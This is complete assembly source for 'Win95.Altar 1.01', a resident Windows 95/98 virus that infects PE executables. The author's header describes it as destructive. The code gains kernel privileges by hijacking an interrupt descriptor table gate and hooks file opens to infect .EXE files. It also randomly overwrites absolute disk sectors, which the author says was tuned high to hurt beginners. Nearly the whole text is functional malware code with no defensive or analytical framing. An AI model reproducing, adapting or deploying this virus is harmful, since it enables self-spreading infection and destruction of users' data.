;============================================================================
;
;
;         NAME: Win95.Altar 1.01
;           OS: Windoze 95/98.
;         TYPE: Parasitic resident (VxD) PE-infector.
;         SIZE: Around 800 bytes.
;       AUTHOR: T-2000 / Immortal Riot.
;       E-MAIL: T2000_@hotmail.com
;         DATE: June 1999.
;  DESTRUCTIVE: Yeah.
;
;     FEATURES:
;
;       - Gains ring-0 by hacking an IDT-gate.
;       - Hosts don't increase in size.
;       - Payload: random sector-trashing.
;
;  Here's some simple ring-0 VxD-virus, just to try-out the idea. The trash-
;  chance was set rather high, just to fuck beginners :P
;
;============================================================================


                .386p
                .MODEL  FLAT
                .CODE

                ORG     0

EXTRN           ExitProcess:PROC

IFSMgr                          EQU     0040h
GetHeap                         EQU     000Dh
UniToBCSPath                    EQU     0041h
InstallFileSystemAPIhook        EQU     0067h
Ring0_FileIO                    EQU     0032h
IFSFN_OPEN                      EQU     36
R0_WRITEFILE                    EQU     0D601h

Virus_Size                      EQU     (Virus_End-START)
Virus_Size_Mem                  EQU     (End_Virus_Mem-START)


START:
                PUSH    (1000h+(Carrier-START))
Host_EIP        =       DWORD PTR $-4

                PUSHFD
                PUSHAD

                CALL    Get_Delta

                MOV     EAX, EBP

                SUB     EAX, 1000h              ; Calculate base-address.
Virus_RVA       =       DWORD PTR $-4

                ADD     [ESP+(9*4)], EAX        ; Add base to the EIP RVA.

                XOR     EAX, EAX

                CALL    Setup_SEH               ; Bail-out without errors
                                                ; under NT.
                MOV     ESP, [ESP+(2*4)]

                JMP     Return_Host

Setup_SEH:      PUSH    DWORD PTR FS:[EAX]
                MOV     FS:[EAX], ESP

                PUSH    EAX                     ; Store IDT in EAX.
                SIDT    [ESP-2]
                POP     EAX

                LEA     EBX, [EBP+(Ring0_Installation-START)]

                XCHG    [EAX+(3*8)], BX         ; Hack IDT-gate.
                ROR     EBX, 16
                XCHG    [EAX+(3*8)+6], BX

                INT     3

                MOV     [EAX+(3*8)+6], BX       ; Restore IDT-gate.
                ROL     EBX, 16
                MOV     [EAX+(3*8)], BX

Return_Host:    XOR     EAX, EAX                ; Restore the original SEH.

                POP     DWORD PTR FS:[EAX]
                POP     EAX

                POPAD
                POPFD

                RET                             ; RETurn to our host.


Copyright       DB      '[Altar] by T-2000 / Immortal Riot', 0


VxD_Ring0_FileIO:

                INT     20h
                DW      Ring0_FileIO
                DW      IFSMgr

                RET


Ring0_Installation:

                PUSHFD
                PUSHAD

                MOV     EAX, DR2                ; Get DR2 in EAX.

                CMP     AL, 'T'                 ; We're already resident?
                JE      Exit_R0_Inst

                LEA     EDI, [EBP+(VxD_Ring0_FileIO-START)]

                MOV     AX, 20CDh
                STOSW

                MOV     [EDI], 00400032h

                MOV     [EDI+(VxD_Call_1-VxD_Ring0_FileIO)-2], AX
                MOV     [EDI+(VxD_Call_2-VxD_Ring0_FileIO)-2], AX
                MOV     [EDI+(VxD_Call_3-VxD_Ring0_FileIO)-2], AX

                MOV     [EDI+(VxD_Call_1-VxD_Ring0_FileIO)], 0040000Dh
                MOV     [EDI+(VxD_Call_2-VxD_Ring0_FileIO)], 00400067h
                MOV     [EDI+(VxD_Call_3-VxD_Ring0_FileIO)], 00400041h

                PUSH    Virus_Size_Mem          ; Allocate memory from the
                INT     20h                     ; global heap.
                DW      GetHeap
                DW      IFSMgr
VxD_Call_1      =       $-6
                POP     ECX

                OR      EAX, EAX                ; Error occurred?
                JZ      Exit_R0_Inst

                MOV     ESI, EBP                ; Copy us to VxD-memory.
                MOV     EDI, EAX
                CLD
                REP     MOVSB

                MOV     [EAX+(Busy_Switch-START)], ECX

                ADD     EAX, (Ring0_Hook-START)

                PUSH    EAX                     ; Insert our file-hook.
                INT     20h
                DW      InstallFileSystemAPIhook
                DW      IFSMgr
VxD_Call_2      =       $-6
                POP     EBX

                XCHG    ECX, EAX                ; Error?
                JECXZ   Exit_R0_Inst

                MOV     [EBX+(Prev_Handler-Ring0_Hook)], ECX

                MOV     AL, 'T'                 ; Mark us as resident.
                MOV     DR2, EAX

Exit_R0_Inst:   POPAD
                POPFD

                IRETD                           ; Back to our ring-3 part.


Ring0_Hook:
                JMP     $+666h
Busy_Switch     =       DWORD PTR $-4

                PUSHFD
                PUSHAD

                CALL    Get_Delta

                MOV     DWORD PTR [EBP+(Busy_Switch-START)], (JMP_Prev_Hook-Busy_Switch) - 4

                CMP     DWORD PTR [ESP+(9*4)+(2*4)], IFSFN_OPEN
                JNE     Exit_Infect

                CALL    Get_Random

                CMP     DL, 5
                JA      Obtain_Name

                CALL    Get_Random

                MOV     AX, 0DE02h              ; R0_WRITEABSOLUTEDISK
                INC     ECX
                LEA     ESI, [EBP+(Copyright-START)]
                CALL    VxD_Ring0_FileIO

Obtain_Name:    MOV     EBX, [ESP+(9*4)+(6*4)]  ; IOREQ-structure.

                MOV     ESI, [EBX+(3*4)]        ; Unicode-path.

                CLD
                LODSD

                PUSH    DWORD PTR [ESP+(9*4)+(5*4)]
                PUSH    259
                PUSH    ESI
                LEA     ESI, [EBP+(ANSI_Target-START)]
                PUSH    ESI
                INT     20h
                DW      UniToBCSPath
                DW      IFSMgr
VxD_Call_3      =       $-6

                ADD     ESP, (4*4)              ; Fix stack.

                OR      EDX, EDX                ; No problems during the
                JNZ     Exit_Infect             ; conversion?

                MOV     [ESI+EAX], DL

                CMP     [ESI+EAX-4], 'EXE.'     ; Standard .EXE-file?
                JNE     Exit_Infect

                XOR     EAX, EAX                ; R0_OPENCREATFILE
                MOV     AH, 0D5h
                PUSH    02h
                POP     EBX
                INC     EDX
                CALL    VxD_Ring0_FileIO
                JC      Exit_Infect

                XCHG    EBX, EAX                ; Save filehandle in EBX.

                XOR     EAX, EAX                ; R0_GETFILESIZE
                MOV     AH, 0D8h
                CALL    VxD_Ring0_FileIO

                CMP     EAX, 4096               ; Avoid infecting files which
JC_Close_File:  JB      Close_File              ; are too small.

                MOV     [EBP+(Victim_Size-START)], EAX

                LEA     EDI, [EBP+(Header-START)]

                ; Read-in the DOS MZ-header.

                XOR     EAX, EAX                ; R0_READFILE
                MOV     AH, 0D6h
                PUSH    40h
                POP     ECX
                XOR     EDX, EDX
                MOV     ESI, EDI
                CALL    VxD_Ring0_FileIO
                JC      JC_Close_File

                CMP     [EDI.MZ_Mark], 'ZM'     ; It's a valid .EXE-file?
                JNE     Close_File

                MOV     EDX, [EDI+3Ch]          ; Pointer to PE-header.

                MOV     [EBP+(PE_Header_Offs-START)], EDX

                ; Read-in PE-header.

                XOR     EAX, EAX                ; R0_READFILE
                MOV     AH, 0D6h
                PUSH    92
                POP     ECX
                CALL    VxD_Ring0_FileIO

                CMP     [EDI.PE_Mark], 'EP'     ; Verify the PE-header.
                JNE     Close_File

                CMP     [EDI.PE_Checksum], -666h        ; Avoid infected
                JE      Close_File                      ; files.

                MOVZX   EAX, [EDI.Object_Count]
                DEC     EAX
                PUSH    40
                POP     ECX
                MUL     ECX

                MOVZX   DX, [EDI.NT_Header_Size]

                LEA     EDX, [EDX+24+EAX]

                ADD     EDX, [EBP+(PE_Header_Offs-START)]

                MOV     [EBP+(Last_Obj_Offset-START)], EDX

                ; Read-in the last object-header.

                XOR     EAX, EAX                ; R0_READFILE
                MOV     AH, 0D6h
                PUSH    40
                POP     ECX
                LEA     ESI, [EBP+(Last_Obj_Table-START)]
                CALL    VxD_Ring0_FileIO

                MOV     EAX, [ESI.Section_Physical_Size]

                CMP     EAX, [ESI.Section_Virtual_Size]
                JBE     Check_Size

                MOV     EAX, [ESI.Section_Virtual_Size]

Check_Size:     PUSH    EAX

                MOV     ECX, Virus_Size

                ADD     EAX, ECX
                ADD     EAX, [ESI.Section_Physical_Offset]

                CMP     EAX, 12345678h          ; File increases in size?
Victim_Size     =       DWORD PTR $-4

                POP     EAX

                JA      Close_File              ; Then abort the infect.

                PUSH    EAX

                PUSH    EAX

                ADD     EAX, ECX

                PUSH    EAX

                MOV     ECX, [EDI.File_Align]
                CALL    Align_EAX

                CMP     [ESI.Section_Physical_Size], EAX
                JNB     Calc_New_Virt

                MOV     [ESI.Section_Physical_Size], EAX

Calc_New_Virt:  POP     EAX
                MOV     ECX, [EDI.Object_Align]
                CALL    Align_EAX

                CMP     [ESI.Section_Virtual_Size], EAX
                JNB     Set_New_EIP

                ADD     [EDI.Image_Size], EAX

                XCHG    [ESI.Section_Virtual_Size], EAX

                SUB     [EDI.Image_Size], EAX

Set_New_EIP:    POP     EAX

                ADD     EAX, [ESI.Section_RVA]

                MOV     [EBP+(Virus_RVA-START)], EAX

                XCHG    [EDI.EIP_RVA], EAX

                MOV     [EBP+(Host_EIP-START)], EAX

                ; Write updated object-header back to disk.

                MOV     EAX, R0_WRITEFILE
                PUSH    40
                POP     ECX
                MOV     EDX, 12345678h
Last_Obj_Offset =       DWORD PTR $-4
                CALL    VxD_Ring0_FileIO

                POP     EDX

                ; Insert virus-body into our victim.

                MOV     EAX, R0_WRITEFILE
                MOV     ECX, Virus_Size
                ADD     EDX, [ESI.Section_Physical_Offset]
                MOV     ESI, EBP
                CALL    VxD_Ring0_FileIO

                ; Mark file as infected.

                MOV     [EDI.PE_Checksum], -666h

                ; Write updated PE-header back to disk.

                MOV     EAX, R0_WRITEFILE
                PUSH    92
                POP     ECX
                MOV     EDX, 12345678h
PE_Header_Offs  =       DWORD PTR $-4
                MOV     ESI, EDI
                CALL    VxD_Ring0_FileIO

                ; Close the file.

Close_File:     XOR     EAX, EAX                ; R0_CLOSEFILE
                MOV     AH, 0D7h
                CALL    VxD_Ring0_FileIO

Exit_Infect:    XOR     EAX, EAX                ; Reset busy-flag.

                MOV     [EBP+(Busy_Switch-START)], EAX

                POPAD
                POPFD

JMP_Prev_Hook:  JMP     DS:[12345678h]
Prev_Handler    =       DWORD PTR $-4


                DB      'Awaiting the sacrifice...', 0


Align_EAX:
                XOR     EDX, EDX
                DIV     ECX

                OR      EDX, EDX
                JZ      Calc_Aligned

                INC     EAX

Calc_Aligned:   MUL     ECX

                RET


Get_Delta:
                CALL    Get_EIP
Get_EIP:        POP     EBP
                SUB     EBP, (Get_EIP-START)

                RET


Get_Random:
                IN      EAX, 40h
                ADD     EDX, EAX

Randomize:      IN      EAX, 40h
                XCHG    AH, AL

                ADD     EAX, 0DEADBEEFh

                RCL     EDX, 3

                XOR     EDX, EAX

                LOOP    Randomize

                RET

Virus_End:

ANSI_Target     DB      260 DUP(0)

Header          DB      92 DUP(0)

Last_Obj_Table  DB      40 DUP(0)

End_Virus_Mem:


Carrier:
                PUSH    0
                CALL    ExitProcess




; The good old MZ-header...

MZ_Header               STRUC
MZ_Mark                 DW      0
MZ_Image_Mod_512        DW      0
MZ_Image_512_Pages      DW      0
MZ_Reloc_Items          DW      0
MZ_Header_Size_Mem      DW      0
MZ_Min_Size_Mem         DW      0
MZ_Max_Size_Mem         DW      0
MZ_Program_SS           DW      0
MZ_Program_SP           DW      0
MZ_Checksum             DW      0
MZ_Program_IP           DW      0
MZ_Program_CS           DW      0
MZ_Reloc_Table          DW      0
MZ_Header               ENDS


PE_Header               STRUC
PE_Mark                 DD      0               ; PE-marker (PE/0/0).
CPU_Type                DW      0               ; Minimal CPU required.
Object_Count            DW      0               ; Number of sections in PE.
			DD      0
Reserved_1              DD      0
			DD      0
NT_Header_Size          DW      0
PE_Flags                DW      0
			DD      4 DUP(0)
EIP_RVA                 DD      0
			DD      2 DUP(0)
Image_Base              DD      0
Object_Align            DD      0
File_Align              DD      0
			DW      0, 0
			DW      0, 0
			DW      0, 0
PE_Reserved_5           DD      0
Image_Size              DD      0
Headers_Size            DD      0
PE_Checksum             DD      0
			DW      0
DLL_Flags               DW      0
PE_Header               ENDS


Section_Header          STRUC
Section_Name            DB      8 DUP(0)        ; Zero-padded section-name.
Section_Virtual_Size    DD      0               ; Memory-size of section.
Section_RVA             DD      0               ; Start section in memory.
Section_Physical_Size   DD      0               ; Section-size in file.
Section_Physical_Offset DD      0               ; Section file-offset.
Section_Reserved_1      DD      0               ; Not used for executables.
Section_Reserved_2      DD      0               ; Not used for executables.
Section_Reserved_3      DD      0               ; Not used for executables.
Section_Flags           DD      0               ; Flags of the section.
Section_Header          ENDS


                END     START





